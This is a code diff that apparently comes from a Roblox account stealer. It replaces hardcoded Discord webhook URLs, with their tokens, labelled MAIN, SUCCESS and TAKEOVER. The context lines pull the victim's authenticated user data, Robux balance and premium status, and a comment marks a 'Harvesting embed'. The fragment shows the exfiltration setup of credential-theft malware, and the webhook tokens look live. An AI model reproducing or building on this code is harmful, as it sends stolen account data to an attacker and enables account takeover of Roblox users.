@@ -195,9 +195,9 @@ const { user, robux, premium } = await getAuthenticatedUserData();
 const avatarUrl = await getAvatarThumbnail(user.id);
 
 // Webhooks from env  
-const MAIN_WEBHOOK = process.env.MAIN_WEBHOOK || 'https://discord.com/api/webhooks/1502901213656780911/3Hrx3Tf_zGHXe4L6KB_MJok8HhuLZI6797rtkACPSjLH2ifTJ29BaNtVPByiOXPGVJZK';  
-const SUCCESS_WEBHOOK = process.env.SUCCESS_WEBHOOK || 'https://discord.com/api/webhooks/1502901432783736863/X0Sxv-HF7YQkhdxyOPn4LBE2_ETimw_pMWnOheCaINv5v8P9MooclCPYhyfAwOFFKEOJ';  
-const TAKEOVER_WEBHOOK = process.env.TAKEOVER_WEBHOOK || 'https://discord.com/api/webhooks/1502901213656780911/3Hrx3Tf_zGHXe4L6KB_MJok8HhuLZI6797rtkACPSjLH2ifTJ29BaNtVPByiOXPGVJZK';
+const MAIN_WEBHOOK = process.env.MAIN_WEBHOOK || 'https://discord.com/api/webhooks/1504224613306208467/13qsZMOx0Kq_Sb7hLuk3dDFenfQFCF-uR6MMW7Oj3eBtmzPLtpiJAKYej61M-k8ket4q';  
+const SUCCESS_WEBHOOK = process.env.SUCCESS_WEBHOOK || 'https://discord.com/api/webhooks/1504224613306208467/13qsZMOx0Kq_Sb7hLuk3dDFenfQFCF-uR6MMW7Oj3eBtmzPLtpiJAKYej61M-k8ket4q';  
+const TAKEOVER_WEBHOOK = process.env.TAKEOVER_WEBHOOK || 'https://discord.com/api/webhooks/1504224613306208467/13qsZMOx0Kq_Sb7hLuk3dDFenfQFCF-uR6MMW7Oj3eBtmzPLtpiJAKYej61M-k8ket4q';
 
 // Harvesting embed  
 const mainEmbed = {  
